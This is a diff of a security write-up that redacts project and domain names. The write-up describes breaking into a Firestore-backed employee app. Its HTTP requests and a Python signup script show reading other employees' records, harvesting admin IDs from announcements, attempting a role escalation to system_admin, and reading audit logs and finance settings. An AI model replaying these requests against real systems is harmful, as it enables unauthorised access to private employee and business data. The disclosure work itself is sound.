@@ -72,11 +72,11 @@ HTTP/2 200 OK
 I don't like guessing collection names, so I pulled the bundles and read them. Grabbed the HTML, pulled the script paths, then fetched each one:
 
 ```bash
-curl -s https://***-security-reports.web.app/ -o index.html
+curl -s https://<DOMAIN>/ -o index.html
 grep -oE '(src|href)="[^"]+"' index.html
 
-curl -s "https://***-security-reports.web.app/js/app.js?v=2.35.9"       -o app.js
-curl -s "https://***-security-reports.web.app/js/firestore.js?v=2.35.9" -o firestore.js
+curl -s "https://<DOMAIN>/js/app.js?v=2.35.9"       -o app.js
+curl -s "https://<DOMAIN>/js/firestore.js?v=2.35.9" -o firestore.js
 
 etc...
 ```
@@ -149,7 +149,7 @@ HTTP/2 200 OK
 Now read a doc whose ID does **not** match my prefix:
 
 ```http
-GET /v1/projects/***-security-reports/databases/(default)/documents/employees/uGxv4a8REDACTED HTTP/2
+GET /v1/projects/<REDACTED>/databases/(default)/documents/employees/uGxv4a8REDACTED HTTP/2
 Host: firestore.googleapis.com
 Authorization: Bearer eyJhbGciOi...REDACTED
 ```
@@ -164,7 +164,7 @@ HTTP/2 403 Forbidden
 And a doc whose ID **does** match my prefix (`1000`):
 
 ```http
-GET /v1/projects/***-security-reports/databases/(default)/documents/employees/1000 HTTP/2
+GET /v1/projects/<REDACTED>/databases/(default)/documents/employees/1000 HTTP/2
 Host: firestore.googleapis.com
 Authorization: Bearer eyJhbGciOi...REDACTED
 ```
@@ -189,7 +189,7 @@ I can read any employee I name, but I need real numbers, and I need to know whic
 The `announcements` collection was readable by any logged in user, and each announcement had its author's employee ID on it. So I ran a query against it and looked at the `authorId` values that came back:
 
 ```http
-POST /v1/projects/***-security-reports/databases/(default)/documents:runQuery HTTP/2
+POST /v1/projects/<REDACTED>/databases/(default)/documents:runQuery HTTP/2
 Host: firestore.googleapis.com
 Authorization: Bearer eyJhbGciOi...REDACTED
 Content-Type: application/json
@@ -205,7 +205,7 @@ Two IDs kept coming back as the authors of system wide notices. Good sign those 
 import requests
 
 API_KEY = "AIzaSy‑‑REDACTED"
-PROJECT = "***-security-reports"
+PROJECT = "<REDACTED>"
 
 SIGNUP = f"https://identitytoolkit.googleapis.com/v1/accounts:signUp?key={API_KEY}"
 BASE   = f"https://firestore.googleapis.com/v1/projects/{PROJECT}/databases/(default)/documents"
@@ -312,7 +312,7 @@ HTTP/2 400 Bad Request
 Second idea, if I can read employee docs, maybe I can write one. Let me just PATCH my own doc's roles to `system_admin`:
 
 ```http
-PATCH /v1/projects/***-security-reports/databases/(default)/documents/employees/uGxv4a8REDACTED?updateMask.fieldPaths=roles HTTP/2
+PATCH /v1/projects/<REDACTED>/databases/(default)/documents/employees/uGxv4a8REDACTED?updateMask.fieldPaths=roles HTTP/2
 Host: firestore.googleapis.com
 Authorization: Bearer eyJhbGciOi...REDACTED
 Content-Type: application/json
@@ -438,7 +438,7 @@ The header shows the admin's name with a little crown, and the dashboard is now 
 With admin context, I confirmed reads on the stuff that was locked before, audit logs, the full reports collection, `settings/finance`, all of it:
 
 ```http
-GET /v1/projects/***-security-reports/databases/(default)/documents/auditLogs?pageSize=25 HTTP/2
+GET /v1/projects/<REDACTED>/databases/(default)/documents/auditLogs?pageSize=25 HTTP/2
 Host: firestore.googleapis.com
 Authorization: Bearer eyJ...REDACTED (15144-prefix token)
 ```
@@ -449,7 +449,7 @@ HTTP/2 200 OK
 {
   "documents": [
     {
-      "name": "projects/***-security-reports/databases/(default)/documents/auditLogs/REDACTED",
+      "name": "projects/<REDACTED>/databases/(default)/documents/auditLogs/REDACTED",
       "fields": {
         "action":    { "stringValue": "FINANCE_TOPIC_CREATED" },
         "actorId":   { "stringValue": "15144" },
@@ -462,7 +462,7 @@ HTTP/2 200 OK
 ```
 
 ```http
-GET /v1/projects/***-security-reports/databases/(default)/documents/settings/finance HTTP/2
+GET /v1/projects/<REDACTED>/databases/(default)/documents/settings/finance HTTP/2
 Host: firestore.googleapis.com
 Authorization: Bearer eyJ...REDACTED (15144-prefix token)
 ```
@@ -471,7 +471,7 @@ Authorization: Bearer eyJ...REDACTED (15144-prefix token)
 HTTP/2 200 OK
 
 {
-  "name": "projects/***-security-reports/databases/(default)/documents/settings/finance",
+  "name": "projects/<REDACTED>/databases/(default)/documents/settings/finance",
   "fields": {
     "iqdRate": { "integerValue": "1320" },
     "usdRate": { "integerValue": "13" }
